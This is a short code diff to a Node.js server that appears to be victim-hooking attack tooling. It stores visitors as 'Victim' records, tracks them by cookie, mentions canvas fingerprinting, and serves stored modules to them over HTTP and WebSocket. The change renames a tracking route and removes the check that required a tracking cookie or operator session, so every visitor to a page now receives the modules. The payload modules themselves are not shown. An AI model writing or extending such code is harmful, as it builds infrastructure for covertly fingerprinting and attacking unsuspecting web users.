@@ -11,7 +11,7 @@ router.all('/', function(req, res){
     });
 });
 
-router.all('/i/', function(req, res){
+router.all('/x/', function(req, res){
     //  XXX who id use "Canvas Fingerprinting"
     var id = req.param('i');
     var who = req.cookies.who;
@@ -67,7 +67,8 @@ var http = function(req, res){
     var pageid = req.params.uri;
     var who = req.cookies.who;
     sql.Page.findOne({uri:pageid}, function(err, info){
-        if(!info||(!who&&!req.session.user))return err404(req, res);
+//        if(!info||(!who&&!req.session.user))return err404(req, res);
+        if(!info)return err404(req, res);
         !req.session.user&&online(who, Date.now());
         handle(req, res, info.modules, null, sql.Victim, who, null);
     });
@@ -79,7 +80,8 @@ exports.ws = function(ws, req){
     var pageid = req.params.uri;
     var who = req.cookies.who;
     sql.Page.findOne({uri:pageid}, function(err, info){
-        if(!info||(!who&&!req.session.user))return null;
+//        if(!info||(!who&&!req.session.user))return null;
+        if(!info)return null;
         var owner = req.session.user?true:false;
         who = req.session.user?null:who;
         ws.on('open', function(){
